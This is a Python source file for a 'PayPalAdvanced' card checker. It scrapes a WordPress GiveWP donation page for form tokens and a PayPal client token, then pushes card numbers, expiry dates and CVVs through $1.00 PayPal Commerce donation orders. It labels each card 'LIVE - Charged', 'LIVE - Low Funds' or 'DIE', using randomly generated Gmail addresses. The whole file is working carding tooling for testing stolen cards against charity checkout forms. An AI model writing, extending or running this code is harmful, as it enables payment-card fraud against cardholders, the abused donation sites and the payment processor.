class PayPalAdvanced:
    def __init__(self, url: str = None):
        self.url = url or ConnectionEncryptor.get_url("paypal_base").replace("https://", "")
        self.pattern = re.compile(r'^\s*(\d{15,16}|\d{4}(?:[ \-]?\d{4}){3})[ \|\/-]+(\d{1,2})[ \|\/-]+(\d{2,4})[ \|\/-]+(\d{3,4})\s*$')
        self.console = Console()

    def GenMail(self) -> str:
        return f"moha.{''.join(random.choices(ascii_lowercase + digits, k=7))}@gmail.com"

    async def Check(self, card, month, year, cvv, email):
        if len(year) == 4: year = year[-2:]
        month = month.zfill(2)
        async with aiohttp.ClientSession() as session:
            h_get = {'referer': f'https://{self.url}', 'user-agent': ConnectionEncryptor.get_header("user_agent")}
            async with session.get(f'https://{self.url}', headers=h_get) as resp:
                html = await resp.text()
                id1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
                id2 = re.search(r'name="give-form-id" value="(.*?)"', html)
                hv = re.search(r'name="give-form-hash" value="(.*?)"', html)
                token = re.search(r'"data-client-token":"(.*?)"', html)
                if not (id1 and id2 and hv and token): return "❌ DIE - Extraction Error"
                ct = token.group(1)
                data = base64.b64decode(ct).decode('utf-8')
                at = re.search(r'"accessToken":"(.*?)"', data).group(1)

            url_aj = f"https://{self.url}/wp-admin/admin-ajax.php"
            d_init = {
                'give-honeypot': '', 'give-form-id-prefix': id1.group(1), 'give-form-id': id2.group(1),
                'give-form-hash': hv.group(1), 'give-amount': '1.00', 'payment-mode': 'paypal-commerce',
                'give_email': email, 'give_action': 'purchase', 'action': 'give_process_donation', 'give_ajax': 'true'
            }
            async with session.post(url_aj, headers=h_get, data=d_init) as resp:
                cookies = {k: v.value for k, v in resp.cookies.items()}

            form = aiohttp.FormData()
            fields = {
                'give-form-id-prefix': id1.group(1), 'give-form-id': id2.group(1), 'give-form-hash': hv.group(1),
                'give-amount': '1.00', 'payment-mode': 'paypal-commerce', 'give_email': email, 'give_gateway': 'paypal-commerce'
            }
            for k, v in fields.items(): form.add_field(k, v)

            async with session.post(url_aj, params={'action': 'give_paypal_commerce_create_order'}, data=form, cookies=cookies) as resp:
                js = await resp.json()
                oid = js.get('data', {}).get('id')
                if not oid: return "❌ DIE - Order Error"

            h_conf = {
                'authorization': f'Bearer {at}', 'content-type': ConnectionEncryptor.get_header("json_type"),
                'origin': ConnectionEncryptor.get_header("origin_paypal"), 'user-agent': ConnectionEncryptor.get_header("user_agent")
            }
            payl = {
                'payment_source': {'card': {'number': card, 'expiry': f'20{year}-{month}', 'security_code': cvv}}
            }
            await session.post(f'https://cors.api.paypal.com/v2/checkout/orders/{oid}/confirm-payment-source', headers=h_conf, json=payl)

            async with session.post(url_aj, params={'action': 'give_paypal_commerce_approve_order', 'order': oid}, data=form, cookies=cookies) as resp:
                res_text = await resp.text()
                if 'true' in res_text or 'success' in res_text: return "✅ LIVE - Charged"
                if 'INSUFFICIENT_FUNDS' in res_text: return "✅ LIVE - Low Funds"
                return "❌ DIE - Declined"

    async def run_single(self, card_str):
        p = card_str.split("|")
        if len(p) != 4: return "❌ DIE - Format Error"
        return await self.Check(p[0], p[1], p[2], p[3], self.GenMail())

